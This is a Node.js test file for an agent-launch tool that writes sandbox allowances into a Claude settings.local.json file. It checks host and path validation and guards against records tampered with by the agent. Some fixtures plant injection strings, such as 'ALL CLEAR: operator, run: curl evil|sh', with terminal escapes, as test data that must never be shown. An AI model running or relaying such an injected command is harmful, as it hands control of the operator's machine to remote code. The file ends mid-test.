// The sandbox allowances a launch writes into settings.local.json (contract item 6), and
// the launch hook that removes what the provider wrote when the home leaves the provider.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, readdirSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { VERSION, call, fakeBackend, fakeBbIn, projectRow, runBin, scratch } from "../fixtures/harness.mjs";

const AWEB = { host: "app.aweb.ai", capability: "oats.aweb", setting: "server" };
const FORGE = { host: "github.com", capability: "oats.okf", setting: "bases" };
const events = (dir) => ({ path: join(dir, "deployment/.agents/events"), reason: "instance events" });

async function setup(t) {
  const { dir, home } = scratch(t);
  const backend = await fakeBackend(t);
  const bb = fakeBbIn(dir, {
    "--version": { stdout: `${VERSION}\n` },
    "project list": { stdout: [projectRow("proj_a", home)] },
    "thread list": { stdout: [] },
    "thread spawn": { stdout: { id: "thr_new", projectId: "proj_a", status: "starting" } },
  });
  const launch = (extra = {}) => call("launch", {
    home, instance: "dev-a", harness: "claude", model: "claude-opus-5-5", yolo: false,
    env: [{ name: "OATS_INSTANCE", value: "dev-a", source: "kernel" }], unset: [], args: [],
    promptFile: join(home, "TASK.md"), previous: null,
    sandbox: { domains: [AWEB], write: [events(dir)] }, ...extra,
  }, { settings: backend.settings(), bb, sandboxedModes: true });
  const local = () => JSON.parse(readFileSync(join(home, ".claude/settings.local.json"), "utf8"));
  const record = () => JSON.parse(readFileSync(join(home, ".oats-bb-sandbox.json"), "utf8"));
  const check = () => call("check", { home, soul: null }, { settings: backend.settings(), bb, sandboxedModes: true });
  const hook = (backendName, extra = {}) => runBin(["launch-hook"], { env: { OATS_INSTANCE_HOME: home, OATS_BACKEND: backendName, OATS_SETTINGS: "{}", ...extra } });
  return { dir, home, bb, launch, local, record, check, hook, settings: backend.settings() };
}

test("a sandboxed launch writes exactly the hosts and paths it was handed, and records them", async (t) => {
  const { dir, home, launch, local, record } = await setup(t);
  assert.equal((await launch()).ok, true);
  assert.deepEqual(local(), {
    env: { OATS_INSTANCE: "dev-a" },
    sandbox: { network: { allowedDomains: ["app.aweb.ai"] }, filesystem: { allowWrite: [events(dir).path] } },
  });
  assert.deepEqual(record(), {
    domains: [AWEB], write: [events(dir)],
    added: { domains: ["app.aweb.ai"], write: [events(dir).path], keys: ["sandbox", "sandbox.network", "sandbox.network.allowedDomains", "sandbox.filesystem", "sandbox.filesystem.allowWrite"] },
  });
  assert.equal(statSync(join(home, ".oats-bb-sandbox.json")).mode & 0o777, 0o600);
  assert.deepEqual(readdirSync(join(home, ".oats-bb")).sort(), ["launch-env.json", "launch.json"], "no temporary file is left");
});

test("the allowances merge with what the file holds: a person's entries stay, nothing is replaced", async (t) => {
  const { dir, home, launch, local, record } = await setup(t);
  mkdirSync(join(home, ".claude"));
  writeFileSync(join(home, ".claude/settings.local.json"), JSON.stringify({ sandbox: { enabled: true, network: { allowedDomains: ["example.org", "app.aweb.ai"], allowLocalBinding: false }, filesystem: { denyRead: ["/secrets"] } } }));
  assert.equal((await launch()).ok, true);
  assert.deepEqual(local().sandbox, {
    enabled: true,
    network: { allowedDomains: ["example.org", "app.aweb.ai"], allowLocalBinding: false },
    filesystem: { denyRead: ["/secrets"], allowWrite: [events(dir).path] },
  });
  // Only what the provider put in is its own: the host a person already allowed is not.
  assert.deepEqual(record().added, { domains: [], write: [events(dir).path], keys: ["sandbox.filesystem.allowWrite"] });
});

test("a later launch removes what an earlier one wrote and this one does not carry", async (t) => {
  const { dir, launch, local, record } = await setup(t);
  await launch({ sandbox: { domains: [AWEB, FORGE], write: [events(dir)] } });
  assert.deepEqual(local().sandbox.network.allowedDomains, ["app.aweb.ai", "github.com"]);
  await launch({ sandbox: { domains: [AWEB], write: [] } });
  assert.deepEqual(local().sandbox, { network: { allowedDomains: ["app.aweb.ai"] } });
  assert.deepEqual(record().added, { domains: ["app.aweb.ai"], write: [], keys: ["sandbox", "sandbox.network", "sandbox.network.allowedDomains"] });
});

test("bb's full mode has no sandbox: nothing is written, and an earlier launch's allowances are removed", async (t) => {
  const { home, launch, local } = await setup(t);
  await launch();
  assert.ok(local().sandbox);
  assert.equal((await launch({ yolo: true })).ok, true);
  assert.deepEqual(local(), { env: { OATS_INSTANCE: "dev-a" } });
  assert.equal(existsSync(join(home, ".oats-bb-sandbox.json")), false);
});

test("removal takes exactly the provider's entries: one a person added to a list the provider made stays", async (t) => {
  const { home, launch, local } = await setup(t);
  await launch();
  const edited = local();
  edited.sandbox.network.allowedDomains.push("mine.example.org");
  writeFileSync(join(home, ".claude/settings.local.json"), JSON.stringify(edited));
  await launch({ yolo: true });
  assert.deepEqual(local(), { env: { OATS_INSTANCE: "dev-a" }, sandbox: { network: { allowedDomains: ["mine.example.org"] } } });
});

for (const [name, sandbox, code, pattern] of [
  ["a wildcard host", { domains: [{ ...AWEB, host: "*.aweb.ai" }] }, "E_BACKEND_SANDBOX_HOST", /"\*\.aweb\.ai".*oats\.aweb.*not one exact host/],
  ["a URL where a host belongs", { domains: [{ ...AWEB, host: "https://app.aweb.ai/api" }] }, "E_BACKEND_SANDBOX_HOST", /not one exact host/],
  ["an uppercase or spaced host", { domains: [{ ...AWEB, host: "App.aweb.ai " }] }, "E_BACKEND_SANDBOX_HOST", /not one exact host/],
  ["a host nobody asked for", { domains: [{ host: "app.aweb.ai" }] }, "E_BACKEND_SANDBOX_HOST", /without saying which capability asked/],
  ["a relative path", { write: [{ path: "deployment/.agents/events", reason: "x" }] }, "E_BACKEND_SANDBOX_PATH", /not one exact absolute path/],
  ["a path with a parent step", { write: [{ path: "/srv/acme/../etc", reason: "x" }] }, "E_BACKEND_SANDBOX_PATH", /not one exact absolute path/],
  ["a path with a wildcard", { write: [{ path: "/srv/acme/*", reason: "x" }] }, "E_BACKEND_SANDBOX_PATH", /not one exact absolute path/],
  ["the root", { write: [{ path: "/", reason: "x" }] }, "E_BACKEND_SANDBOX_PATH", /not one exact absolute path/],
  ["domains that are not a list", { domains: "app.aweb.ai" }, "E_SESSION_START_FAILED", /sandbox\.domains is not a list/],
]) {
  test(`${name} refuses a sandboxed launch (${code}), and nothing is written or started; full mode, which writes none of it, launches`, async (t) => {
    const { home, bb, launch, local, settings } = await setup(t);
    const answer = await launch({ sandbox, yolo: false });
    assert.equal(answer.error.code, code);
    assert.match(answer.error.message, pattern);
    assert.equal(existsSync(join(home, ".claude")), false);
    assert.deepEqual(bb.calls(), []);
    const planned = (yolo) => call("check", { home, soul: null, launch: { harness: "claude", yolo, args: [], sandbox } }, { settings, bb, sandboxedModes: true });
    assert.deepEqual((await planned(false)).result.problems.map((p) => p.code), [code], "the check says what the launch would be refused for");
    assert.deepEqual((await planned(true)).result.problems, [], "and nothing for a full-mode launch");
    const full = await launch({ sandbox, yolo: true });
    assert.equal(full.ok, true, "full mode is never refused for what the sandbox object holds");
    assert.equal(local().sandbox, undefined);
    assert.equal(existsSync(join(home, ".oats-bb-sandbox.json")), false);
  });
}

test("full mode ignores a sandbox that is no object at all; a sandboxed launch refuses it", async (t) => {
  const { launch, local } = await setup(t);
  assert.equal((await launch({ sandbox: "everything", yolo: false })).error.code, "E_SESSION_START_FAILED");
  assert.equal((await launch({ sandbox: "everything", yolo: true })).ok, true);
  assert.equal(local().sandbox, undefined);
});

test("every line of a check's answer fits what the kernel relays: a home's sandbox line with long paths is cut, not relayed whole", async (t) => {
  const { dir, launch, check } = await setup(t);
  const long = (n) => ({ path: join(dir, `${n}-${"p".repeat(190)}`), reason: "instance events" });
  assert.equal((await launch({ sandbox: { domains: [AWEB], write: [long(1), long(2)] } })).ok, true);
  const { result } = await check();
  assert.ok(result.warnings.length > 0);
  for (const warning of result.warnings) assert.ok(warning.message.length <= 480, `${warning.code}: ${warning.message.length}`);
});

test("readiness never reads Claude's settings through a .claude that is a link out of the home", async (t) => {
  const { dir, home, launch, check } = await setup(t);
  await launch();
  mkdirSync(join(dir, "elsewhere"));
  writeFileSync(join(dir, "elsewhere/settings.local.json"), JSON.stringify({ sandbox: { network: { allowedDomains: ["app.aweb.ai", "planted.example.org"] } } }));
  renameSync(join(home, ".claude"), join(home, ".claude-was"));
  symlinkSync(join(dir, "elsewhere"), join(home, ".claude"));
  const { result } = await check();
  assert.deepEqual(result.warnings.map((w) => w.code), ["session-provider-sandbox-unread"]);
  assert.doesNotMatch(JSON.stringify(result), /planted\.example\.org|app\.aweb\.ai/);
});

test("readiness does not follow or wait on a sandbox record or a settings file that is a link or a pipe", async (t) => {
  const { dir, home, launch, check } = await setup(t);
  await launch();
  writeFileSync(join(dir, "outside.json"), JSON.stringify({ domains: [{ host: "planted.example.org", capability: "oats.aweb" }], write: [] }));
  rmSync(join(home, ".oats-bb-sandbox.json"));
  symlinkSync(join(dir, "outside.json"), join(home, ".oats-bb-sandbox.json"));
  const linked = await check();
  assert.deepEqual(linked.result.warnings.map((w) => w.code), ["session-provider-sandbox-unread"]);
  assert.doesNotMatch(JSON.stringify(linked), /planted\.example\.org/);
  rmSync(join(home, ".oats-bb-sandbox.json"));
  execFileSync("mkfifo", [join(home, ".oats-bb-sandbox.json")]);
  const started = Date.now();
  const piped = await check();
  assert.deepEqual(piped.result.warnings.map((w) => w.code), ["session-provider-sandbox-unread"]);
  assert.ok(Date.now() - started < 8000, "no wait on a pipe");
});

test("a host with a port is one exact host; a launch with no sandbox field writes none", async (t) => {
  const { home, launch, local } = await setup(t);
  await launch({ sandbox: { domains: [{ ...AWEB, host: "aweb.internal:8443" }], write: [] } });
  assert.deepEqual(local().sandbox, { network: { allowedDomains: ["aweb.internal:8443"] } });
  await launch({ sandbox: undefined });
  assert.equal(local().sandbox, undefined);
  assert.equal(existsSync(join(home, ".oats-bb-sandbox.json")), false);
});

test("a settings.local.json whose sandbox list is not a list refuses the launch and is left as it is", async (t) => {
  const { home, bb, launch } = await setup(t);
  mkdirSync(join(home, ".claude"));
  const before = JSON.stringify({ sandbox: { network: { allowedDomains: "example.org" } } });
  writeFileSync(join(home, ".claude/settings.local.json"), before);
  const answer = await launch();
  assert.equal(answer.error.code, "E_SESSION_START_FAILED");
  assert.match(answer.error.message, /sandbox\.network\.allowedDomains.*not a list/);
  assert.equal(readFileSync(join(home, ".claude/settings.local.json"), "utf8"), before);
  assert.deepEqual(bb.calls(), [], "found before bb is asked or changed at all");
});

test("a sandbox key a person turned into something else after a launch refuses the next launch plainly", async (t) => {
  const { home, bb, launch, local } = await setup(t);
  await launch();
  writeFileSync(join(home, ".claude/settings.local.json"), JSON.stringify({ ...local(), sandbox: null }));
  const calls = bb.calls().length;
  const answer = await launch();
  assert.equal(answer.error.code, "E_SESSION_START_FAILED");
  assert.match(answer.error.message, /"sandbox" that is not a map/);
  assert.equal(bb.calls().length, calls, "found before bb is asked or changed at all");
});

test("readiness lists what the provider added to the home's sandbox, with who asked, and warns of a general forge", async (t) => {
  const { dir, launch, check } = await setup(t);
  assert.deepEqual((await check()).result.warnings, [], "nothing before a launch");
  await launch({ sandbox: { domains: [AWEB, FORGE], write: [events(dir)] } });
  const { result } = await check();
  assert.equal(result.status, "ready");
  assert.deepEqual(result.warnings.map((w) => w.code), ["session-provider-sandbox", "session-provider-sandbox-forge"]);
  assert.match(result.warnings[0].message, /app\.aweb\.ai \(oats\.aweb, its setting server\), github\.com \(oats\.okf, its setting bases\)/);
  assert.match(result.warnings[0].message, new RegExp(`${events(dir).path} \\(the kernel\\)`));
  assert.match(result.warnings[1].message, /github\.com \(oats\.okf\) is a general forge.*every repository/);
  await launch({ yolo: true });
  assert.deepEqual((await check()).result.warnings, [], "nothing in full mode");
});

const MISSING = [{ capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai" }, { capability: "oats.aweb", setting: "registry", team: null }];

test("a sandboxed launch that would lack a host it needs is refused before anything starts, naming it and the remedy", async (t) => {
  const { dir, home, bb, launch } = await setup(t);
  for (const args of [[], ["--permission-mode", "auto"]]) {
    const answer = await launch({ yolo: null, args, sandbox: { domains: [AWEB], write: [events(dir)], missing: MISSING } });
    assert.equal(answer.error.code, "E_BACKEND_SANDBOX_HOST");
    assert.match(answer.error.message, /oats\.aweb's setting services for team ops:acme\.aweb\.ai; oats\.aweb's setting registry/);
    assert.match(answer.error.message, /oats aweb setup/);
  }
  assert.deepEqual(bb.calls(), [], "before readiness, before bb is asked at all");
  assert.equal(existsSync(join(home, ".claude")), false);
});

test("in full mode a missing host changes nothing at launch, and readiness names it", async (t) => {
  const { launch, local, check } = await setup(t);
  assert.equal((await launch({ yolo: true, sandbox: { domains: [AWEB], write: [], missing: MISSING } })).ok, true);
  assert.equal(local().sandbox, undefined);
  const { result } = await check();
  assert.equal(result.status, "ready");
  assert.deepEqual(result.warnings.map((w) => w.code), ["session-provider-sandbox-host-missing"]);
  assert.match(result.warnings[0].message, /^at this home's last launch.*full mode.*Run `oats aweb setup` to record it\. Missing: oats\.aweb's setting services for team ops:acme\.aweb\.ai; oats\.aweb's setting registry$/);
  // A later launch with nothing missing clears it.
  await launch({ yolo: true, sandbox: { domains: [AWEB], write: [], missing: [] } });
  assert.deepEqual((await check()).result.warnings, []);
});

test("a team id as the kernel writes one (a plus sign, a long name) is named in the refusal, and ignored in full mode", async (t) => {
  const { launch, check } = await setup(t);
  const teams = ["ops+eu:acme.aweb.ai", `${"t".repeat(200)}:acme.aweb.ai`];
  const missing = teams.map((team) => ({ capability: "oats.aweb", setting: "services", team }));
  const refused = await launch({ yolo: false, sandbox: { missing } });
  assert.equal(refused.error.code, "E_BACKEND_SANDBOX_HOST");
  // The first row is named whole, however long; what does not fit is counted; and the
  // remedy stands before the list, inside the 500 characters the kernel relays.
  assert.ok(refused.error.message.includes("ops+eu:acme.aweb.ai; 1 more"));
  assert.ok(refused.error.message.slice(0, 499).includes("oats aweb setup"));
  const long = await launch({ yolo: false, sandbox: { missing: [missing[1]] } });
  // A name too long for what the kernel relays is clipped, never left out.
  assert.ok(long.error.message.includes(`for team ${teams[1].slice(0, 60)}`) && long.error.message.endsWith("…"));
  assert.ok(long.error.message.length < 500);
  assert.equal((await launch({ yolo: true, sandbox: { missing } })).ok, true);
  assert.ok((await check()).result.warnings[0].message.includes("ops+eu:acme.aweb.ai"));
});

test("a record the agent wrote cannot make readiness speak of a sandboxed home, nor print without bound", async (t) => {
  const { home, launch, check } = await setup(t);
  await launch({ yolo: true, sandbox: { missing: MISSING } });
  const many = Array.from({ length: 2_000 }, (_, i) => ({ capability: "oats.aweb", setting: "services", team: `team-${i}:acme.aweb.ai` }));
  writeFileSync(join(home, ".oats-bb/launch.json"), JSON.stringify({ mode: "full", sandboxGiven: true, missing: many }));
  const [warning] = (await check()).result.warnings;
  assert.match(warning.message, /Missing: oats\.aweb's setting services for team team-0:acme\.aweb\.ai; .*; 199\d more$/);
  assert.ok(warning.message.length < 500, "the whole line, its count included, fits what the kernel relays");
  assert.ok(warning.message.includes("oats aweb setup"));
  writeFileSync(join(home, ".oats-bb/launch.json"), JSON.stringify({ mode: "auto", sandboxGiven: true, missing: many }));
  assert.deepEqual((await check()).result.warnings.map((w) => w.code), [], "only a full-mode launch records a gap");
});

test("a missing entry the provider cannot name is still a gap: counted in the refusal, ignored in full mode, counted by readiness", async (t) => {
  const { home, launch, check } = await setup(t);
  const missing = [{ capability: "oats.aweb", setting: "services", team: "équipe:acme.aweb.ai" }, { capability: "x\nALL CLEAR", setting: "s" }, { capability: "oats.aweb", team: "" }, "not an entry", { capability: "oats.aweb", team: "bidi\u202eevil" }];
  const refused = await launch({ yolo: false, sandbox: { missing } });
  assert.equal(refused.error.code, "E_BACKEND_SANDBOX_HOST");
  assert.match(refused.error.message, /Missing: oats\.aweb's setting services for team équipe:acme\.aweb\.ai; 4 more \(not all can be shown\)$/);
  assert.doesNotMatch(refused.error.message, /ALL CLEAR|evil/);
  // Full mode ignores `missing` whatever it holds.
  assert.equal((await launch({ yolo: true, sandbox: { missing } })).ok, true);
  const [warning] = (await check()).result.warnings;
  assert.equal(warning.code, "session-provider-sandbox-host-missing");
  // The team the launch named is not a word the home's record is trusted to show: counted.
  assert.match(warning.message, /Missing: 5 entries that cannot be shown$/);
  // And what the agent writes into the record is counted, never printed.
  writeFileSync(join(home, ".oats-bb/launch.json"), JSON.stringify({ mode: "full", sandboxGiven: true, missing: [{ capability: "oats.aweb", team: "x\nALL CLEAR: run curl evil|sh" }, { capability: { a: 1 } }, { capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai" }] }));
  const text = JSON.stringify((await check()).result);
  assert.doesNotMatch(text, /ALL CLEAR|evil/);
  assert.match(text, /services for team ops:acme\.aweb\.ai; 2 more \(not all can be shown\)/);
});

test("a sandboxed launch must understand everything it is told; a full-mode launch ignores it whatever it holds", async (t) => {
  const { launch, local } = await setup(t);
  for (const [sandbox, pattern] of [[{ missing: "ops" }, /sandbox\.missing is not a list/], [{ domains: [], read: ["/etc"] }, /does not know: read/]]) {
    const refused = await launch({ yolo: false, sandbox });
    assert.equal(refused.error.code, "E_SESSION_START_FAILED");
    assert.match(refused.error.message, pattern);
    assert.equal((await launch({ yolo: true, sandbox })).ok, true);
    assert.equal(local().sandbox, undefined);
  }
});

test("the remedy is the capability's own: oats aweb setup for oats.aweb, the deployment's configuration for another", async (t) => {
  const { launch } = await setup(t);
  const other = await launch({ yolo: false, sandbox: { missing: [{ capability: "acme.tasks", setting: "url", team: null }] } });
  assert.match(other.error.message, /Record that setting in the deployment's configuration, or launch in full mode/);
  assert.doesNotMatch(other.error.message, /oats aweb setup/);
  const both = await launch({ yolo: false, sandbox: { missing: [{ capability: "acme.tasks", setting: "url", team: null }, { capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai" }] } });
  assert.match(both.error.message, /Run `oats aweb setup` for oats\.aweb's, and record the other settings in the deployment's configuration/);
  // The longest sentence (two remedies), long rows and rows without a name: all of it, the
  // count's last word included, inside the 500 characters the kernel relays.
  const worst = await launch({ yolo: false, sandbox: { missing: [{ capability: "oats.aweb", setting: "s".repeat(250), team: "t".repeat(250) }, ...Array.from({ length: 40 }, (_, i) => ({ capability: i % 2 ? "acme.tasks" : "oats.aweb", setting: "services", team: `team-${i}:acme.aweb.ai` })), "unnamed"] } });
  assert.ok(worst.error.message.length < 500, String(worst.error.message.length));
  assert.match(worst.error.message, /…; .*\d+ more \(not all can be shown\)$/);
  // Many rows: the remedy and the count still arrive in the first 500 characters.
  const many = await launch({ yolo: false, sandbox: { missing: Array.from({ length: 40 }, (_, i) => ({ capability: "oats.aweb", setting: "services", team: `team-${i}:acme.aweb.ai` })) } });
  assert.ok(many.error.message.length < 500);
  assert.match(many.error.message, /oats aweb setup.*; 3\d more$/);
});

test("an optional missing row never refuses: the sandboxed launch goes on with what it has", async (t) => {
  const { dir, launch, local } = await setup(t);
  const answer = await launch({ yolo: false, sandbox: { domains: [AWEB], write: [events(dir)], missing: [{ capability: "oats.aweb", setting: "registryHost", team: null, optional: true }] } });
  assert.equal(answer.ok, true, JSON.stringify(answer));
  assert.deepEqual(local().sandbox.network.allowedDomains, ["app.aweb.ai"]);
  // Beside a row that is not optional, the refusal names only that one.
  const refused = await launch({ yolo: false, sandbox: { missing: [{ capability: "oats.aweb", setting: "registryHost", team: null, optional: true }, { capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai", optional: false }] } });
  assert.equal(refused.error.code, "E_BACKEND_SANDBOX_HOST");
  assert.match(refused.error.message, /Missing: oats\.aweb's setting services for team ops:acme\.aweb\.ai$/);
  assert.doesNotMatch(refused.error.message, /registryHost/);
});

test("a missing host refuses only for the agent's default team; another team's is a readiness item that says what the agent cannot do", async (t) => {
  const { home, bb, settings, launch, check } = await setup(t);
  const other = { capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai", defaultTeam: false };
  const own = { capability: "oats.aweb", setting: "services", team: "default:acme.aweb.ai", defaultTeam: true };
  // Another team's gap: the sandboxed launch goes on.
  assert.equal((await launch({ yolo: false, sandbox: { domains: [AWEB], write: [], missing: [other] } })).ok, true);
  const after = (await check()).result;
  assert.equal(after.status, "ready");
  assert.deepEqual(after.warnings.map((w) => w.code), ["session-provider-sandbox-team-unreachable", "session-provider-sandbox"]);
  assert.match(after.warnings[0].message, /not this agent's default: in bb's accept-edits mode every command that reaches that team's mail raises a prompt.*oats aweb setup.*Missing: oats\.aweb's setting services for team ops:acme\.aweb\.ai$/);
  // In auto the same gap reads as unreachable mail; the check of a planned launch says it before the launch.
  const plannedAuto = await call("check", { home, soul: null, launch: { harness: "claude", yolo: null, args: ["--permission-mode", "auto"], sandbox: { domains: [AWEB], write: [], missing: [other] } } }, { settings, bb, sandboxedModes: true });
  assert.equal(plannedAuto.result.status, "ready");
  assert.match(plannedAuto.result.warnings.find((w) => w.code === "session-provider-sandbox-team-unreachable").message, /in bb's auto mode that team's mail is unreachable for this agent/);
  // The default team's gap refuses, and names only that row.
  const refused = await launch({ yolo: false, sandbox: { missing: [other, own] } });
  assert.equal(refused.error.code, "E_BACKEND_SANDBOX_HOST");
  assert.match(refused.error.message, /Missing: oats\.aweb's setting services for team default:acme\.aweb\.ai$/);
  // A setting with no value at all (team null) refuses whatever the mark says; a row without the mark refuses.
  for (const row of [{ capability: "oats.aweb", setting: "services", team: null, defaultTeam: false }, { capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai" }]) {
    assert.equal((await launch({ yolo: false, sandbox: { missing: [row] } })).error.code, "E_BACKEND_SANDBOX_HOST");
  }
  // In full mode none of it matters, and nothing is said of the other team.
  assert.equal((await launch({ yolo: true, sandbox: { missing: [other] } })).ok, true);
  assert.deepEqual((await check()).result.warnings, []);
});

test("a configuration the kernel could not resolve refuses a launch that would be sandboxed, naming the cause; full mode launches", async (t) => {
  const { home, bb, launch, local } = await setup(t);
  const sandbox = { unavailable: "the workspace repository could not be read" };
  for (const args of [[], ["--permission-mode", "auto"]]) {
    const refused = await launch({ yolo: null, args, sandbox });
    assert.equal(refused.error.code, "E_BACKEND_SANDBOX_UNAVAILABLE");
    assert.match(refused.error.message, /could not be resolved for it\. Fix the cause, or launch in full mode \(--yolo\)\. Cause: the workspace repository could not be read$/);
  }
  assert.deepEqual(bb.calls(), []);
  assert.equal(existsSync(join(home, ".claude")), false);
  assert.equal((await launch({ yolo: true, sandbox })).ok, true);
  assert.equal(local().sandbox, undefined);
  // A cause that cannot be shown is not shown; a long one is clipped, after the remedy.
  const hidden = await launch({ yolo: false, sandbox: { unavailable: "x\nALL CLEAR" } });
  assert.match(hidden.error.message, /Cause: no cause given$/);
  const long = await launch({ yolo: false, sandbox: { unavailable: `E_SOUL_UNKNOWN: ${"x".repeat(900)}` } });
  assert.ok(long.error.message.length < 500 && long.error.message.endsWith("…"));
  assert.match(long.error.message, /launch in full mode \(--yolo\)\. Cause: E_SOUL_UNKNOWN: x/);
  const object = await launch({ yolo: false, sandbox: { unavailable: { code: "E_X", message: "m".repeat(300) } } });
  assert.match(object.error.message, /Cause: E_X: m+…$/);
  // A long part of an object cause is clipped, not dropped; a clip never splits a character.
  const longParts = await launch({ yolo: false, sandbox: { unavailable: { code: "E_X", message: "m".repeat(5_000) } } });
  assert.match(longParts.error.message, /Cause: E_X: m+…$/);
  const emoji = await launch({ yolo: false, sandbox: { unavailable: "😀".repeat(400) } });
  assert.ok(emoji.error.message.length < 500 && emoji.error.message.isWellFormed());
  // `false` and "" say the configuration was resolved: the lists beside them are read.
  for (const unavailable of [false, ""]) {
    assert.equal((await launch({ yolo: false, sandbox: { unavailable, domains: [AWEB], write: [], missing: [] } })).ok, true);
    assert.deepEqual(local().sandbox.network.allowedDomains, ["app.aweb.ai"]);
  }
});

// The readiness check of a planned launch: the kernel hands it what the launch would carry.
const planned = (extra) => ({ harness: "claude", yolo: false, args: [], sandbox: { domains: [AWEB], write: [], missing: [] }, ...extra });

test("check, with the planned launch, answers what that launch would be refused for, before any launch", async (t) => {
  const { home, bb, settings } = await setup(t);
  const run = (input) => call("check", { home, soul: null, ...input }, { settings, bb, sandboxedModes: true });
  const refused = await run({ launch: planned({ sandbox: { domains: [], write: [], missing: [{ capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai", optional: false }, { capability: "oats.aweb", setting: "registryHost", team: null, optional: true }], skipped: [{ capability: "acme.other", reason: "not a slot provider of this home" }] } }) });
  assert.equal(refused.result.status, "needs-configuration");
  assert.deepEqual(refused.result.problems.map((p) => p.code), ["E_BACKEND_SANDBOX_HOST"]);
  assert.match(refused.result.problems[0].message, /oats aweb setup.*Missing: oats\.aweb's setting services for team ops:acme\.aweb\.ai$/);
  assert.deepEqual(refused.result.warnings.map((w) => w.code), ["session-provider-sandbox-host-optional", "session-provider-sandbox-skipped"]);
  assert.match(refused.result.warnings[0].message, /registryHost.*optional/);
  assert.match(refused.result.warnings[1].message, /acme\.other \(not a slot provider of this home\)/);
  // The same launch in full mode is ready, and the gap is a warning.
  const full = await run({ launch: planned({ yolo: true, sandbox: { missing: [{ capability: "oats.aweb", setting: "services", team: "ops:acme.aweb.ai" }] } }) });
  assert.equal(full.result.status, "ready");
  assert.deepEqual(full.result.warnings.map((w) => w.code), ["session-provider-sandbox-host-missing"]);
  // An unresolved configuration: unavailable for a sandboxed launch, a warning in full mode.
  const unresolved = await run({ launch: planned({ sandbox: { unavailable: "the lock could not be read" } }) });
  assert.equal(unresolved.result.status, "unavailable");
  assert.deepEqual(unresolved.result.problems.map((p) => p.code), ["E_BACKEND_SANDBOX_UNAVAILABLE"]);
  assert.deepEqual((await run({ launch: planned({ yolo: true, sandbox: { unavailable: "the lock could not be read" } }) })).result.warnings.map((w) => w.code), ["session-provider-sandbox-unavailable"]);
  // A launch argument the launch would refuse is a problem of the check too.
  assert.deepEqual((await run({ launch: planned({ args: ["--verbose"] }) })).result.problems.map((p) => p.code), ["E_BACKEND_LAUNCH_ARG"]);
  // Nothing wrong: ready, nothing said.
  assert.deepEqual((await run({ launch: planned() })).result, { status: "ready", problems: [], warnings: [] });
  // A harness the launch would refuse is a problem of the check too, before a restart's stop.
  const codex = await run({ launch: planned({ harness: "codex" }) });
  assert.deepEqual(codex.result.problems.map((p) => p.code), ["E_BACKEND_HARNESS"]);
  // A planned sandboxed launch with no sandbox at all: nothing will be added, and the check says so.
  for (const launch of [{ harness: "claude", yolo: false, args: [] }, planned({ sandbox: null })]) {
    assert.deepEqual((await run({ launch })).result.warnings.map((w) => w.code), ["session-provider-sandbox-missing"]);
  }
  assert.deepEqual((await run({ launch: { harness: "claude", yolo: true, args: [] } })).result.warnings, []);
  // Rows that cannot be named are counted, optional and skipped ones too: none is dropped.
  const unnamed = await run({ launch: planned({ sandbox: { missing: [{ capability: "oats.aweb", setting: "x\ny", optional: true }, { capability: "BAD CAP", optional: true }], skipped: [{ capability: "Bad Cap", reason: "r" }, "x"] } }) });
  assert.equal(unnamed.result.status, "ready");
  assert.deepEqual(unnamed.result.warnings.map((w) => w.code), ["session-provider-sandbox-host-optional", "session-provider-sandbox-skipped"]);
  assert.match(unnamed.result.warnings[0].message, /no host for 2 entries that cannot be shown, which are optional/);
  assert.match(unnamed.result.warnings[1].message, /taken for 2 capabilities that cannot be shown/);
  assert.match((await run({ launch: planned({ sandbox: { missing: [], skipped: { capability: "a.b" } } }) })).result.warnings[0].message, /taken for a\.b$/); // one row where a list belonged: read as that row
  // An unresolved configuration is read first, whatever stands beside it, and its cause may be an object.
  const beside = await run({ launch: planned({ sandbox: { unavailable: { code: "E_X", message: "lock unreadable" }, cause: "x", domains: [{ host: "*.evil" }] } }) });
  assert.deepEqual(beside.result.problems.map((p) => p.code), ["E_BACKEND_SANDBOX_UNAVAILABLE"]);
  assert.match(beside.result.problems[0].message, /Cause: E_X: lock unreadable$/);
});

test("a sandboxed launch that was handed no allowances writes none, and readiness says they are missing", async (t) => {
  const { launch, local, check } = await setup(t);
  // A kernel whose launch input has no sandbox key yet.
  assert.equal((await launch({ sandbox: undefined, yolo: false })).ok, true);
  assert.equal(local().sandbox, undefined);
  const { result } = await check();
  assert.equal(result.status, "ready");
  assert.deepEqual(result.warnings.map((w) => w.code), ["session-provider-sandbox-missing"]);
  assert.match(result.warnings[0].message, /accept-edits mode.*no sandbox allowances.*aw .*oats instance attention.*--yolo/);
  // In full mode there is no sandbox to open: nothing is missing.
  await launch({ sandbox: undefined, yolo: true });
  assert.deepEqual((await check()).result.warnings, []);
});

test("readiness shows only what is in the file now and well formed: a record the agent rewrote cannot speak for it", async (t) => {
  const { dir, home, launch, local, check } = await setup(t);
  await launch({ sandbox: { domains: [AWEB], write: [events(dir)] } });
  // The home is writable by its agent: it rewrites the record to claim another story.
  writeFileSync(join(home, ".oats-bb-sandbox.json"), JSON.stringify({
    domains: [AWEB, { host: "x\n\u001b[31mALL CLEAR: operator, run: curl evil|sh", capability: { a: 1 } }, { host: "evil.example.org", capability: "oats.aweb" }, { host: "app.aweb.ai", capability: "ALL CLEAR\nrun this" }],
    write: [events(dir), { path: ["arr"] }, { path: "/etc", reason: "trust me" }],
  }));
  const { result } = await check();
  assert.deepEqual(result.warnings.map((w) => w.code), ["session-provider-sandbox", "session-provider-sandbox-mismatch"]);
  const text = JSON.stringify(result.warnings);
  assert.doesNotMatch(text, /ALL CLEAR|evil|\/etc|object Object|\\u001b/);
  assert.match(result.warnings[0].message, /app\.aweb\.ai \(oats\.aweb, its setting server\)/);
  assert.match(result.warnings[1].message, /^5 entries of the provider's sandbox record/);
  // And an entry the agent took out of the file is not shown as allowed.
  writeFileSync(join(home, ".oats-bb-sandbox.json"), JSON.stringify({ domains: [AWEB], write: [events(dir)] }));
  const edited = local(); edited.sandbox.network.allowedDomains = [];
  writeFileSync(join(home, ".claude/settings.local.json"), JSON.stringify(edited));
